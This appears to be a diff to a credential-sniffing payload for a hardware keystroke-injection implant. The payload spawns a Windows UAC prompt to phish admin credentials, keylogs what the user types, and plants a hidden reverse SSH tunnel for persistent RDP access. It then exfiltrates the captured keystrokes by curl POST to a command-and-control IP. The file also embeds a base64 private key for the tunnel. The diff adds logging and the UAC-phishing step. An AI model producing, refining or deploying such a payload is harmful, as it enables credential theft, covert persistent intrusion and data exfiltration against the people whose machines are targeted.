@@ -9,7 +9,7 @@
 ####################Config###################################################
 
 # Set these before deploying:
-C2_IP="192.168.0.213"          # Your C2 IP or hostname
+C2_IP="172.21.51.113"          # Your C2 IP or hostname
 C2_PORT="8443"                 # C2 HTTP port
 C2_SSH_PORT="22"               # C2 SSH port for reverse tunnel
 C2_SSH_USER="hadareklund"           # Unprivileged user on C2 that accepts tunnels
@@ -29,6 +29,18 @@ TUNNEL_KEY_B64="LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFy
 # se=Swedish, de=German, us=English, fr=French, etc.
 export DUCKY_LANG=se
 
+####################Logging##################################################
+LOG_FILE="/root/loot/credsniffer_$(date +%Y%m%d_%H%M%S).log"
+mkdir -p /root/loot
+
+log() {
+    local level="$1"; shift
+    echo "[$(date +%H:%M:%S)] [$level] $*" | tee -a "$LOG_FILE"
+}
+
+log INFO "=== credsniffer payload started ==="
+log INFO "C2_IP=$C2_IP C2_PORT=$C2_PORT C2_SSH_USER=$C2_SSH_USER"
+
 ####################Trigger & Clean Up#######################################
 # IMPORTANT: Only deploy this on a Windows machine at login screen.
 # If triggered elsewhere (BIOS, Linux, etc.), this will freeze keyboard passthrough.
@@ -42,46 +54,54 @@ MATCH \[ENTER\]
 # MATCH \[ENTER\]
 # if [ $(date +%s) -gt $(($(stat -f%B /root 2>/dev/null || echo 0) + 30)) ]; then exit; fi
 
+log INFO "STEP 1: Trigger fired — cleaning old loot"
 rm -f /root/loot/win-pass*
 
-########################Locking User Machine################################
+########################Trigger UAC Credential Prompt########################
+# On standard (non-admin) Windows accounts, requesting elevation opens a
+# credential prompt asking for an admin username + password — NOT just a
+# Yes/No confirmation. SAVEKEYS captures what the user types into that prompt.
+#
+# If the user IS already an admin, UAC shows a simple Yes/No confirmation
+# (no password field) — in that case nothing useful is captured here, but
+# the tunnel persistence still runs in their admin context which is better.
 
-Q LOCK
-Q DELAY 500
-Q GUI l
-Q DELAY 250
-Q DELETE
-Q DELAY 250
-Q UNLOCK
-WAIT_FOR_KEYBOARD_ACTIVITY 1
+log INFO "STEP 2: Sending HID — opening Run dialog for UAC elevation prompt"
+Q DELAY 1000
 
-#######Intercept login keystrokes############################################
-# SAVEKEYS records in the background while keystrokes pass through normally.
-# After the first ENTER, it captures the next 50 key events (password + ENTER).
-# You can still type freely and log in normally.
+# Open Run dialog and trigger elevation request — this spawns the UAC prompt
+Q GUI r
+Q DELAY 600
+Q STRING powershell -Command "Start-Process powershell -Verb RunAs"
+Q ENTER
+Q DELAY 800
 
-SAVEKEYS /root/loot/win-pass.txt NEXT 50 &
-echo $! > /tmp/savekeys.pid  # Store PID so we can wait for it later
-Q DELAY 100  # Let SAVEKEYS initialize
+# Start capturing keystrokes BEFORE the UAC prompt fully appears
+# NEXT 80 covers username field + TAB + password + ENTER
+log INFO "STEP 3: Starting SAVEKEYS capture (80 keys, background)"
+SAVEKEYS /root/loot/win-pass.txt NEXT 80 &
+echo $! > /tmp/savekeys.pid
 
-# Now just wait for the capture to complete before proceeding
-# Poll the file — if it exists, SAVEKEYS succeeded
-for i in {1..30}; do
-    [ -f /root/loot/win-pass.txt ] && break
+# Poll for capture completion — UAC credential entry happens here
+log INFO "STEP 4: Polling for SAVEKEYS output (max 30s)..."
+for i in {1..60}; do
+    [ -f /root/loot/win-pass.txt ] && { log INFO "Capture file appeared after $((i/2))s"; break; }
     sleep 0.5
 done
 
-# If file still doesn't exist after 15 seconds, bail out gracefully
+# Bail out gracefully if nothing was captured (user dismissed UAC, or was already admin)
 if [ ! -f /root/loot/win-pass.txt ]; then
-    echo "[!] SAVEKEYS failed — no keystroke file. Restoring keyboard passthrough."
+    log ERROR "STEP 4 FAILED: No credential captured — UAC dismissed or user already admin."
     exit 1
 fi
+log INFO "STEP 4 OK: Credential file captured ($(wc -c < /root/loot/win-pass.txt) bytes)"
 
 #####################Persistence via Reverse SSH Tunnel######################
 # OpenSSH CLIENT ships with Windows 10 1809+ — available to all users, no admin.
 # The target connects OUT to C2; no inbound firewall rule or new service needed.
 # HID-only mode (no RNDIS) — no USB network adapter visible, no notifications.
 
+log INFO "STEP 5: Sending HID — injecting SSH persistence"
 Q DELAY 3000
 
 # Use wscript.exe to run a hidden VBScript wrapper so the Run dialog
@@ -133,18 +153,31 @@ Q ENTER
 Q DELAY 500
 Q STRING exit
 Q ENTER
+log INFO "STEP 5 OK: Persistence HID commands sent"
 
 # Attacker: RDP to target via C2 tunnel with:  xfreerdp /v:localhost:${REVERSE_PORT}
 
 #####################Exfiltrating Credentials###############################
 # curl uses KeyCroc's own WiFi interface — no RNDIS, no USB NIC, no popups.
+log INFO "STEP 6: Exfiltrating keylog to C2 at ${C2_IP}:${C2_PORT}"
 
-CLEAN_PASS=$(curl -s -X POST "http://${C2_IP}:${C2_PORT}/keylog" \
-     --data-binary @/root/loot/win-pass.txt)
+CLEAN_PASS=$(curl -s -w "\n__HTTP_%{http_code}" -X POST "http://${C2_IP}:${C2_PORT}/keylog" \
+     --data-binary @/root/loot/win-pass.txt 2>>"$LOG_FILE")
 
+HTTP_CODE=$(echo "$CLEAN_PASS" | grep '__HTTP_' | sed 's/__HTTP_//')
+CLEAN_PASS=$(echo "$CLEAN_PASS" | grep -v '__HTTP_')
+
+if [ "$HTTP_CODE" = "200" ]; then
+    log INFO "STEP 6 OK: C2 responded 200 — cleaned password received"
+else
+    log ERROR "STEP 6 FAILED: C2 HTTP response code=${HTTP_CODE} (empty = no route to host)"
+fi
+
+log INFO "C2 returned: ${CLEAN_PASS}"
 echo "[*] C2 returned cleaned password: ${CLEAN_PASS}"
 
 Q DELAY 1000
+log INFO "=== credsniffer payload finished — log at $LOG_FILE ==="
 
 #You may want to delete or disable the payload after execution to avoid re-triggering
 #rm /root/udisk/payloads/credsniffer.txt
